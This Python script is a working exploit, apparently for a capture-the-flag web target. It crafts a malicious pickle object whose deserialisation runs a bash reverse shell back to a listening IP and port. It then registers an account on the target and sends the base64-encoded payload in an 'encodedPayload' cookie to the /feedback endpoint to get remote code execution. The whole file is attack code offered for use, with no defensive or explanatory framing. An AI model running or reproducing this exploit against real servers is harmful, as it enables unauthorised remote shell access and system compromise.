import requests
import sys
from base64 import b64encode
#from base64 import urlsafe_b64encode as b64encode
import pickle

try:

	class bcolors:
		OKBLUE = '\033[94m'
		OKGREEN = '\033[92m'
		ENDC = '\033[0m'
		FAIL = '\033[91m'
	# First we create a reverse shell one liner
	lisening_ip = sys.argv[1]
	port = sys.argv[2]
	server_ip = sys.argv[3]
	command = """bash -c 'bash -i >& /dev/tcp/"""
	command += lisening_ip
	command += """/"""
	command += port
	command += """ 0>&1'"""
	#print (command)
	# First we create a serialized payload
	class payload_generator(object):
		def __reduce__(self):
			import os
			return (os.system,(command, ))
	generated_payload = pickle.dumps(payload_generator())
	print (bcolors.OKBLUE + "[+] Generating Payload"+ bcolors.ENDC)
	encode = b64encode(generated_payload).decode()
	print()
	print (bcolors.OKBLUE + "[+] Payload Generated: " + bcolors.ENDC + str(encode))
	IP = server_ip
	sess = requests.session()
	url = "http://{}/register".format(IP)
	posdata = {"username" : "admin", "password" : "password"}
	print()
	print (bcolors.OKBLUE + "[+] Creating an account be patient" + bcolors.ENDC)
	register = sess.post(url, data=posdata).text
	exchange = sess.get("http://{}/exchange".format(IP))
	feedback = sess.get("http://{}/feedback".format(IP))
	payloadsend = (sess.cookies.get_dict())
	cookie = payloadsend.copy()
	# Changing the payload
	cookie["encodedPayload"] = encode
	print()
	print (bcolors.OKGREEN + "[+] Sending the payload expect a shell soon" + bcolors.ENDC)
	#sess.cookies.set(cookie)
	sess.cookies = cookie
	try:
		feedback = sess.get("http://{}/feedback".format(IP))
		print()
	except:
		pass
		print()
		print (bcolors.FAIL + "[-] Goodbye..........."+ bcolors.ENDC)
except IndexError:
	print()
	print (bcolors.FAIL + "USAGE:\n\npython3 <LISTENING_IP>   <LISTENING_PORT>  <SERVER_IP>" + bcolors.ENDC)
